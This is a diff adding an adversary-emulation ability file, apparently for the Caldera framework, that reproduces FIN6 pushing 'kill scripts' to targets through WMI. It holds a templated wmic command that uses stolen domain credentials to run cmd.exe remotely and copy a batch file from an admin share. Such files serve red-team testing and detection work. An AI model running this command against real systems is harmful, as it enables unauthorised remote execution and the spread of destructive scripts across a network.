@@ -1,0 +1,32 @@
+ability_id: 5dcbd042-e8e5-4f3f-8055-7284e4d5112c
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: FIN6 has utilized WMI to distribute kill scripts to intended targets
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password}
+    process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file}
+    c:\windows\temp\"
+  language: null
+  name: cmd
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Distribute Kill Scripts via WMI
+plugin: emu
+privilege: Elevated
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1047
+technique_name: Windows Management Instrumentation
